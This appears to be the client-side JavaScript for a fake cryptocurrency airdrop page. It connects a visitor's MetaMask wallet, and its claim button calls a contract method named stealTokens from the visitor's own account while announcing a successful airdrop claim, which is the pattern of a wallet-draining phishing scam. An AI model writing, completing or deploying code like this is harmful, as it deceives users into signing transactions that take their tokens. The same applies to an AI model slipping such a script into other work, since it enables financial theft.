let web3;
let accounts;
let contractAddress;
let contractABI;

// Flag to prevent multiple redirections
let isRedirected = false;
let isConnected = false; // Flag to track connection state

// Function to check if MetaMask is available
async function checkMetaMaskAvailability() {
    if (typeof window.ethereum === 'undefined') {
        alert("MetaMask is not installed. Please install MetaMask to continue.");
        return false;
    }
    return true;
}

// Function to connect to MetaMask
async function connectMetaMask() {
    if (!await checkMetaMaskAvailability()) {
        return;
    }

    // Request account access
    try {
        const accountsArray = await window.ethereum.request({ method: 'eth_requestAccounts' });
        accounts = accountsArray;
        web3 = new Web3(window.ethereum);
        isConnected = true;
        console.log("Connected to MetaMask:", accounts);
    } catch (error) {
        alert("Error connecting to MetaMask: " + error.message);
    }
}

// Function to claim the airdrop
async function claimAirdrop() {
    if (!isConnected) {
        alert('Please connect to MetaMask first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', (event) => {
    // Connect MetaMask
    document.getElementById('connectMetaMaskButton').addEventListener('click', connectMetaMask);

    // Claim airdrop
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

    // Load Ethereum configuration and ABI
    loadConfigAndABI('eth'); // Load Ethereum config and ABI
});
